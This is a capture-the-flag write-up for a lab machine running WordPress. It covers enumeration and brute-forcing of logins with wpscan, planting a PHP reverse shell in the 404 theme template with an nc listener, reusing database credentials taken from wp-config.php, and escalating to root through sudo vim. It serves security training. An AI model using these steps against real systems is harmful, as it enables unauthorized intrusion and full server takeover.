## Room Description

An easy level machine with multiple ways to escalate privileges. By Hixec.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm

Went to http://target.thm it is a wordpress site. I found a login form at http://target.thm/wp-login.php. I tried a few different username and password combinations, the form gives an interesting error message: ERROR: Invalid username.

Since it is a WordPress site, I run wpscan:

```bash
$ wpscan --no-update --url http://target.thm -e u -P /usr/share/wordlists/rockyou.txt

```

## Getting a Foothold

I log in with the credentials found at the end of the above output.  It turns out that c0ldd is an admin for the site! I can change the theme to use a PHP reverse shell and get a shell onto the server. I run the following to create a copy of the reverse shell file:

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

I update the file to use my attack box ip address and port 4444. I start a listening shell on my attack machine with the following command:

```bash
$ nc -lnvp 4444
```

I alter the them in the WordPress site by clicking the Appearance > Theme Editor on the left. Then I click the 404.php template and paste the contents of the shell.php mentioned above. I click the Update button and then navigate to a page that will cause a 404 error. In my case, I went to http://target.thm/?p=-2

I have a shell. I'm in!

I get a stable shell by running the commands [found here](/README.md#stable-shell).

## user.txt

I check the home folder and see there is a user named c0ldd:

```bash
$ ls /home
c0ldd
```

There is a /home/c0ldd/user.txt file that I can't read and it is owned by c0ldd.

I tried my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation). None of them found anything. Since I am on the www-data user I looked in the /var/www/html directory and looked at the wp-config.php file. It had the following lines:

```bash
$ cat /var/www/html/wp-config.php
...
/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'REDACTED');
...
```

I switch to the user c0ldd with the password just found:

```bash
$ su c0ldd
```

Now I read the contents of the user.txt file.

```bash
$ cd ~
$ cat user.txt
REDACTED
```

## Escalating Privileges

I run my [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) again this time as c0ldd. I find something interesting:

```bash
$ sudo -l
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Game over, I can get a shell with vim since it allows users to run shell commands from vim and I can run vim as sudo. I do just that:

```bash
$ sudo /usr/bin/vim
```

Then while in vim I run the following:

```bash
:!/bin/bash
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root.

## root.txt

Now I grab the root.txt file:

```bash
# whoami
root
# cd /root
# cat root.txt
REDACTED
```
